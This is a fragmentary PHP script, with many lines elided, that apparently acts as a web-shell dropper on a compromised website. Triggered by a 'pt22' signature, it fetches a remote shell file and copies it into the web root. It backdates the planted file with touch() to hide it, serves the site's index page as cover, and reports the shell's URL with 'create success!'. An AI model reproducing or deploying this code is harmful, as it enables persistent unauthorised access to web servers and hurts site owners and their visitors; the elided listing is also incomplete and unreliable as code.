 	...
 	if($sig=='pt22'){
	 	...
	 	if ($_SERVER["HTTPS"] == "on") 
	    {
 		...
 		for($m=0;$m<count($check_url_arry);$m++){
 			$check_url_arry2[] =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$check_url_arry[$m]);
 			$check_url_cont1.=$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$check_url_arry[$m]).',';
 		}
 		$check_url_arry2[] =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$check_url_arry1[0]);
 		$check_url_cont1.=$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$check_url_arry1[0]);
		...
		*/
		...
		$file_url_arry=array();
		$file_url_cont1='';
		//$file_url_arry[]= str_replace($_SERVER['DOCUMENT_ROOT'],'',dirname(__FILE__));
		...
		for($i=0;$i<count($style1);$i++){
			$shell_file11 =trim($_SERVER['DOCUMENT_ROOT'].$style1[$i]);
 		...
 		$file11=dirname(__FILE__).'/'.basename(__FILE__);
 		$file22=$_SERVER['DOCUMENT_ROOT'].$pos_style;
		...
		exit;
 		...
 		$file_path = $_SERVER['DOCUMENT_ROOT'].'/index.php';
 		$file_path1 = $_SERVER['DOCUMENT_ROOT'].'/index.html';
 		$file_path2 = $_SERVER['DOCUMENT_ROOT'].'/index.htm';
 		$file_path3 = $_SERVER['DOCUMENT_ROOT'].'/default.html';
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			echo $str;
 			exit;
		...
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		...
 		if(check_remote_file_exists($shell_source5)){
	 		...
	 		if(copyfiles($shell_source5,$shell5))
		    {
				...
				$time4=strtotime($time3[0]);
				touch($shell5,$time4);
		        echo $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],"",$shell5).'--create success!';
		    ...
		    else
		    {
		    	...
		    	if($shell51>0){
		    		...
		    		echo $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],"",$shell5).'--create fail!';
		    	}
		    }
 		}
		exit;
